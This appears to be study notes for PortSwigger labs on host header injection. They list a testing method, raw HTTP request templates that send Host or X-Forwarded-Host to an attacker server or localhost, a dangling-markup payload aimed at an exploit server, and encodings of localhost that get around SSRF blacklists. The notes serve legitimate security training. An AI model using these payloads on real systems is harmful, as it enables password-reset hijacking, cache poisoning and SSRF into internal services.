# Host Header Injection - CHEATSHEET + MOST IMPORTANT LABS
## Key Terms

```bash
- Param Miner extension
	  -> guess: headers, params, body, everything!
```

## Walkthrough - Most Important Labs

- [Basis host header attack to retrieve reset token to change password](basic-host-header-attack.md)

- [Host-header-injection-via-web-cache-poisoning+xss](host-header-injection-via-web-cache-poisoning+xss.md)

- [SSRF via arbitraty host + EXTRA lab: absolute path](SSRF-via-arbitraryhost-and-absolute-path.md)

- [SSRF-via-host-validation-bypass-via-connection-state-attack](SSRF-via-host-validation-bypass-via-connection-state-attack.md) ❗


## Methodology

❗ Important: To avoid wasting time during the exam, PortSwigger warns that if an SSRF exists it will always be reachable at **localhost** on **port 6566**. 

```bash
- Discover allowed headers with Param Miner
- Try Arbitrary Host
- Only local users? 
	  -> localhost
	  -> SSRF 
- Inject duplicate host header -> blocked? -> indent.
- Intruder -> !! disable update host to match !! 
- Try absloute path in GET = ignore malicious host 
- Send 2 request in a single connection -> 1 valid + 2 with SSRF
- Try inject in port after port delimeter : delimeter  
```

## Cheat Sheet

```bash
# ARBITRARY HOST / TRY FIRST INSERT COLLABORATOR PAYLOAD 
GET /admin
Host: <VULNERABLE-WEB>:<OUR-SV>||<LOCALHOST-SSRF>

# DUPLICATE HOST / SWITCH ORDER
GET /example HTTP/1.1
Host: <VULNERABLE-WEB>
Host: <OUR-SV>||<LOCALHOST-SSRF>

# MALICIOUS INDENTED <TAB> (TRY MORE TABS) HOST + LEGIT HOST
GET /example HTTP/1.1
	Host: <OUR-SV>||<LOCALHOST-SSRF>         
Host: <VULNERABLE-WEB>

# TRY OTHER HEADERS -> X-Host, X-Forwarded-Server, X-HTTP-Host-Override ... etc
GET /example HTTP/1.1
Host: <VULNERABLE-WEB>
X-Forwarded-Host: <OUR-SV>||<LOCALHOST-SSRF>

# ABSOLUTE PATH = IGNORE HOST 
GET <ABSOLUTE_PATH>            
Host: <OUR-SV>||<LOCALHOST-SSRF>

# MULTIPLE REQUEST IN A SINGLE CONNECTION
## REQUEST 1
GET /
Host: <VALID-HOST>
Connection: keep-alive
## REQUEST 2
GET /admin
Host: <VULNERABLE-WEB>:<OUR-SV>|
Connection: keep-alive

# AFTER PORT : DELIMETER - DANGLING MARKUP
GET /
Host: <YOUR-LAB>:'<a href="//<EXPLOIT-SV>/?
```

> DIFFERENT WAYS TO WRITE LOCALHOST    
> Sometimes, a **blacklist** is used instead of a **whitelist**.
```bash
> localhost -> variations like loCalHost,LOCALHOST, etc
> ①②⑦.⓪.⓪.⓪
> 0x7f000001
> 127.0.0.1  
    in decimal -> 2130706433  
    in binary  -> 01111111.00000000.00000000.00000001  

> Any IP within the loopback range -> 127.0.0.0/8  -> burp intruder

> 127.255.255.255  
    in decimal -> 2147483647  
    in binary  -> 01111111.11111111.11111111.11111111  

> 127.1
```